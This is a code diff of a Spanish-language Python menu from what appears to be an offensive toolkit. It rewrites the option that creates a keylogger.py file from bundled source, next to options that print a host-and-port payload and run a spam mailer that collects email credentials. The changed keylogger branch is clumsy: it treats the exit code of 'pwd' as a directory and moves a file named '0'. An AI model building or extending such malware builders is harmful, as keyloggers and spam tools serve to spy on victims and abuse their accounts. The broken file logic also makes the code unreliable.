@@ -65,29 +65,26 @@ def menu():
             Fore.RESET + str(payload.payload(host,port, ame))
 
         if f == "keylogger":
+            directorio = str(os.system("pwd > /dev/null 2>&1"))
+            if os.path.exists(path="keylogger.py"):
+                os.remove(path="keylogger.py")
+                os.system("cp source/key.py '{0}'".format(directorio))
+                time.sleep(1)
+                os.system("mv 0 keylogger.py")
                 if os.path.exists(path="keylogger.py"):
-                    os.remove(path="keylogger.py")
-                    time.sleep(1)
-                    os.system("cd source/")
-                    time.sleep(1)
-                    os.system("cp re242 ..")
-                    time.sleep(1)
-                    os.system("cd ..")
-                    time.sleep(1)
-                    os.system("mv re242 keylogger.py")
-                    time.sleep(1)
                     print("Keylogger reescrito correctamente")
                     sys.exit()
                 else:
-                    os.system("cd source/")
-                    time.sleep(1)
-                    os.system("cp re242 ..")
-                    time.sleep(1)
-                    os.system("cd ..")
-                    time.sleep(1)
-                    os.system("mv re242 keylogger.py")
-                    print("Keylogger creado satisfactoriamente")
+                    print("hubo un error al reescribir keylogger")
+            else:
+                os.system("cp source/key.py '{0}'".format(directorio))
+                time.sleep(1)
+                os.system("mv 0 keylogger.py")
+                if os.path.exists(path="keylogger.py"):
+                    print("Keylogger creado correctamente")
                     sys.exit()
+                else:
+                    print("hubo un error al crear keylogger")
         if f == "spammail":
             a = input("Ingresa tu correo: ")
             b = input("Ingresa tu contraseña: ")
